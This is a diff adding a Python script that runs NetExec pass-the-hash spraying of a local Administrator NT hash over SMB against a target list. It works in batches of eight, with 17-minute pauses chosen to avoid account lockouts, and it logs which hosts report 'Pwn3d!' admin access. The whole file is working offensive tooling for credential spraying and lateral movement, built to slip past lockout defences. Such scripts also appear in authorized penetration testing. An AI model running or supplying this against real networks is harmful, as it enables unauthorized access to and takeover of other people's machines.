@@ -1,0 +1,127 @@
+#!/usr/bin/env python3
+"""
+Batch runner for NetExec (nxc) with delays to avoid local account lockouts
+
+- Processes targets in groups of 8
+- Waits 17 minutes (1020 seconds) after each group
+- Uses --local-auth for local Administrator hash spraying
+- Logs basic output to console + optional log file
+"""
+
+import subprocess
+import time
+import sys
+from pathlib import Path
+
+# ────────────────────────────────────────────────
+#  CONFIGURATION - CHANGE THESE VALUES
+# ────────────────────────────────────────────────
+
+TARGETS_FILE = "targets.txt"          # one IP/hostname per line
+HASH = "31d6cfe0d16ae931b73c59d7e0c089c0"   # ← replace with your NT hash
+USERNAME = "Administrator"
+
+# Base nxc command parts (add more flags as needed)
+NXC_BASE = [
+    "nxc", "smb",
+    "-u", USERNAME,
+    "-H", HASH,
+    "--local-auth",
+    "--continue-on-success",
+    # "--delay", "30",          # optional small delay between hosts
+    # "--jitter", "10",
+    # "-o", "ContinueOnSuccess=true"
+]
+
+LOGFILE = "nxc_spray_2026.log"         # optional - will append results here
+
+BATCH_SIZE = 8
+WAIT_SECONDS = 17 * 60                 # 17 minutes = 1020 seconds
+
+# ────────────────────────────────────────────────
+
+def run_nxc_on_targets(targets_batch):
+    """Run nxc against a list of targets (one batch)"""
+    print(f"\n[{time.strftime('%Y-%m-%d %H:%M:%S')}] Starting batch of {len(targets_batch)} targets")
+    print("─" * 60)
+
+    for target in targets_batch:
+        print(f"→ {target}")
+        cmd = NXC_BASE + [target]
+
+        try:
+            result = subprocess.run(
+                cmd,
+                capture_output=True,
+                text=True,
+                timeout=120          # kill if one host hangs too long
+            )
+
+            output = result.stdout.strip()
+            if result.returncode == 0 and "Pwn3d!" in output or "(Pwn3d!)" in output:
+                print(f"  [+] SUCCESS / PWNED → {target}")
+            elif "Valid" in output or "admin" in output.lower():
+                print(f"  [+] Admin access → {target}")
+            else:
+                print(f"  [-] Failed / no admin → {target}")
+
+            # Optional: log full output
+            if LOGFILE:
+                with open(LOGFILE, "a", encoding="utf-8") as f:
+                    f.write(f"\n=== {target} === {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
+                    f.write(result.stdout)
+                    if result.stderr:
+                        f.write("\n--- stderr ---\n")
+                        f.write(result.stderr)
+
+        except subprocess.TimeoutExpired:
+            print(f"  [TIMEOUT] {target} - skipped")
+        except Exception as exc:
+            print(f"  [ERROR] {target} → {exc}")
+
+    print("Batch finished.\n")
+
+
+def main():
+    targets_path = Path(TARGETS_FILE)
+
+    if not targets_path.is_file():
+        print(f"Error: File not found → {TARGETS_FILE}")
+        sys.exit(1)
+
+    # Read all targets, strip whitespace
+    with open(targets_path, encoding="utf-8") as f:
+        all_targets = [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]
+
+    if not all_targets:
+        print("No targets found in file.")
+        sys.exit(1)
+
+    print(f"Loaded {len(all_targets)} targets from {TARGETS_FILE}")
+    print(f"Batch size = {BATCH_SIZE}, wait = {WAIT_SECONDS}s ({WAIT_SECONDS//60} min) after each batch\n")
+
+    # Split into batches
+    for i in range(0, len(all_targets), BATCH_SIZE):
+        batch = all_targets[i:i + BATCH_SIZE]
+        batch_number = (i // BATCH_SIZE) + 1
+
+        print(f"Batch {batch_number}/{((len(all_targets)-1)//BATCH_SIZE)+1}  ({len(batch)} hosts)")
+
+        run_nxc_on_targets(batch)
+
+        # Don't wait after the very last batch
+        if i + BATCH_SIZE < len(all_targets):
+            print(f"Waiting {WAIT_SECONDS//60} minutes before next batch...")
+            time.sleep(WAIT_SECONDS)
+            print("Wait finished → starting next batch\n")
+
+    print("\nAll batches completed.")
+
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n[!] Interrupted by user. Exiting cleanly.")
+    except Exception as e:
+        print(f"\nUnexpected error: {e}")
